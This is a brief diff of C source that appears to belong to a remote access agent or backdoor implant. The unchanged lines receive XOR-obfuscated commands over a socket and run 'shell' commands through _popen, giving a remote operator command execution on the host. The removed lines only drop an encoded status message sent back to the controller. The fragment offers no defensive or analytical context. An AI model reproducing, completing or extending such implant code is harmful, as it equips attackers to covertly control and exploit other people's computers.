@@ -105,11 +105,6 @@ int main(void) {
 		else if(str_starts_with(xorbuf, "shell") == 0)
 		{
 			char* cmd = split(xorbuf, " ");
-			char shell_msg[50];
-			snprintf(shell_msg, 50, "\n[+] Executing command on Agent\n\n");
-			char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
-			send(sock, xorshellmsg, strlen(shell_msg), 0);
-			free(xorshellmsg);
 			FILE* fp;
 			char* terminated;
 			fp = _popen(cmd, "r");
